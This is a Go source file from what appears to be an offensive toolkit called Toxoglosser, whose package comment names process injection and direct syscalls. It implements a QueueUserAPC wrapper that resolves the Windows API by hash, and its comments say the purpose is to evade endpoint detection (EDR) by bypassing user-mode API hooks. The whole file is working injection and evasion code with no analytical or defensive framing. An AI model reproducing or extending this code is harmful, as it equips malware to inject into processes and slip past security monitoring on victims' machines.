// Package core provides core functionality for Toxoglosser including
// direct syscalls, process injection techniques, and memory management.
package core

import (
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)


// QueueUserAPC calls the Windows API using manual API resolution
// for better EDR evasion by avoiding user-mode API hooks.
func QueueUserAPC(pfnAPC uintptr, hThread windows.Handle, dwData uintptr) error {
	// Note: QueueUserAPC doesn't have a direct NT syscall equivalent, but we can still improve
	// by using manual API resolution instead of LazyDLL. For now, we'll implement a
	// manual resolution approach similar to what's used elsewhere in the codebase.
	kernel32Module, err := GetModuleHandleByHash("kernel32.dll")
	if err != nil {
		// Fallback to LazyDLL if manual resolution fails
		kernel32 := windows.NewLazySystemDLL("kernel32.dll")
		procQueueUserAPC := kernel32.NewProc("QueueUserAPC")

		ret, _, _ := procQueueUserAPC.Call(
			pfnAPC,
			uintptr(hThread),
			dwData,
		)

		if ret == 0 {
			return windows.GetLastError()
		}
		return nil
	}

	addr, err := GetProcAddressByHash(windows.Handle(kernel32Module), "QueueUserAPC")
	if err != nil {
		// Fallback to LazyDLL if manual resolution fails
		kernel32 := windows.NewLazySystemDLL("kernel32.dll")
		procQueueUserAPC := kernel32.NewProc("QueueUserAPC")

		ret, _, _ := procQueueUserAPC.Call(
			pfnAPC,
			uintptr(hThread),
			dwData,
		)

		if ret == 0 {
			return windows.GetLastError()
		}
		return nil
	}

	// Call the manually resolved function using syscall
	ret, _, _ := syscall.Syscall(addr, 3, pfnAPC, uintptr(hThread), dwData)

	if ret == 0 {
		return windows.GetLastError()
	}
	return nil
}